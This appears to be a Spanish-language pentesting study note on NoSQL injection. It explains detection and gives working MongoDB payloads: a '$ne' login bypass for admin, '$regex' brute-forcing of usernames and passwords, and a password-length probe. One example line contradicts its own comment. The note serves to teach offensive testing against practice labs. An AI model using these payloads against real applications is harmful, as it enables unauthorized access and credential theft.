---------
- Tags: #OWASP_TOP_10 #vulnerabilidad #hacking #NoSQLI
--------------
# Definición

> Las **inyecciones NoSQL** son ataques informáticos que se centran en bases de datos **NoSQL**, como **MongoDB** o **Cassandra**, aprovechando debilidades para acceder o modificar datos de manera no autorizada. Estas inyecciones se producen cuando una aplicación web permite que un atacante envíe datos maliciosos a través de una consulta a la base de datos, que luego puede ser ejecutada por la aplicación sin la debida validación.
> 
> Es un ataque muy parecido a la [[SQL Injection]], solo que las bases de datos ahora son **NoSQL**. Estas inyecciones se aprovechan de consultas hacia la base de datos que se basan en documentos, en lugar de tablas relacionales como **SQL**, para enviar datos maliciosos que puedan manipular la consulta de la base de datos.
> 
> Las inyecciones **NoSQL** explotan la falta de validación de los datos en una consulta a la base de datos.

-----------
# Detección de vulnerabilidad

Podríamos tratar de realizar el siguiente proceso:

- **Búsqueda de entradas de datos:** Tratamos de identificar las áreas en la página donde los usuarios podamos introducir datos, como formularios, campos de búsqueda o incluso una URL con parámetros. 

- **Manipulación de los datos:** Podemos intentar ingresar datos inyectados que podrían explotar una vulnerabilidad NoSQLi. Si la aplicación responde con mensajes de error no esperados o raros, podría ser un indicio de una posible vulnerabilidad. Para ver estos tipos de datos que podrían explotar la vulnerabilidad, podemos visitar la siguiente página: [NoSQLi cheat sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection)

- **Errores de sintaxis o tiempos de respuesta alterados:** Si la aplicación devuelve errores de sintaxis específicos relacionados con la base de datos o si hemos realizado una consulta maliciosa y está ralentizando el tiempo de respuesta de la página web, podría ser también vulnerable.

-----------
# Explotación

En este tipo de ataques trataremos de realizar operaciones como **not equal** o **greater**. Por ejemplo podemos jugar con que el usuario sea admin pero la contraseña no sea igual a admin o cualquier otra cadena. Al realizarse dicha comprobación, se verifica que la contraseña no es igual a lo que se le ha proporcionado, de manera que podríamos tener acceso.

Para poder proceder con el ataque necesitamos interceptar la petición, por lo que haremos uso de la herramienta [[Burpsuite]], y podremos ir modificando los datos a nuestro placer:

```bash
{"username":"admin","password":"test"}         #Petición original en formato json
{"username":"admin", "password": {"$ne":"test"}}    #Petición modificada
```

Esta manera nos garantizaría el ingreso como el usuario admin. 

A veces nos interesaría no solo ganar acceso al sistema, sino conseguir los posibles **usuarios** y **contraseñas** existentes en la base de datos, de manera que podemos trabajar con la función **regex** y trabajar con expresiones regulares para intentar realizar un poco de fuerza bruta de la siguiente manera:

```bash
{"username":"admin","password":"test"}                         #Petición original en formato json

{"username":{"$regex":"^a"}, "password": {"$ne":"test"}}       #No conseguimos acceso, no hay usuarios que empiezan por "a"
{"username":{"$regex":"^b"}, "password": {"$ne":"test"}}       #No conseguimos acceso, no hay usuarios que empiezan por "b"
{"username":{"$regex":"^a"}, "password": {"$ne":"test"}}       #Conseguimos acceso, hay al menos un usuario que empieza por "c"

{"username":{"$regex":"^ca"}, "password": {"$ne":"test"}}       #No conseguimos acceso, no hay usuarios que empiezan por "ca"
{"username":{"$regex":"^cb"}, "password": {"$ne":"test"}}       #No conseguimos acceso, no hay usuarios que empiezan por "cb"
...
```

De esta manera podríamos conseguir los usuarios existentes en la base de datos.

Igualmente se podría realizar para conseguir las contraseñas:

```bash
{"username":"admin","password":"test"}                         #Petición original en formato json

{"username":"admin", "password": {"$regex":"^a"}}       #No conseguimos acceso, la contraseña no empieza por "a"
{"username":"admin", "password": {"$regex":"^b"}}       #No conseguimos acceso, la contraseña no empieza por "b"
{"username":"admin", "password": {"$regex":"^c"}}       #Conseguimos acceso, la contraseña empieza por "c"

{"username":"admin", "password": {"$regex":"^ca"}}       #No conseguimos acceso, la contraseña no empieza por "ca"
{"username":"admin", "password": {"$regex":"^cb"}}       #No conseguimos acceso, la contraseña no empieza por "cb"
...
```

También podemos utilizar la función para conseguir el tamaño de una entidad, por ejemplo, para el tamaño de la contraseña:

```bash
{"username":"admin", "password": {"$regex":".{30}"}}    #No consguimos acceso, la contraseña tiene menos de 30 caracteres
{"username":"admin", "password": {"$regex":".{25}"}}    #Consguimos acceso, la contraseña tiene al menos de 25 caracteres
{"username":"admin", "password": {"$regex":".{29}"}}    #Consguimos acceso, la contraseña tiene 29 caracteres
```

Todo este proceso puede ser un poco tedioso, de manera que podemos automatizarlo en un script, como [[nosqli.py]].


Puede ser que se esté realizando una solicitud **GET** para pedir al servicio algún tipo de información, de manera que podemos interceptar la petición y tratar de convertirla a **POST** y puede ser que se muestre algo más de información. Además podemos intentar cambiar la cabecera *Content-Type* a *json*, y vemos a ver si interpreta la data que le proporcionemos en dicho formato, y si fuera el caso, podríamos proceder al igual que hacemos en el proceso anterior de **fuerza bruta**.


Puede darse el caso que nos estemos enfrentando a una base de datos en **MongoDB**, de manera que podemos probar distintos payloads para intentar conseguir leakear información de la base de datos. Una página donde podemos ver distintos payloads para este servicio es [NoSQLi cheat sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection) o [Hacktricks](https://book.hacktricks.xyz/pentesting-web/nosql-injection).

-------------------------
# Ejemplos prácticos
- [Vulnerable-Node-App](https://github.com/Charlie-belmer/vulnerable-node-app)
- [NoSQLi Lab](https://github.com/digininja/nosqlilab)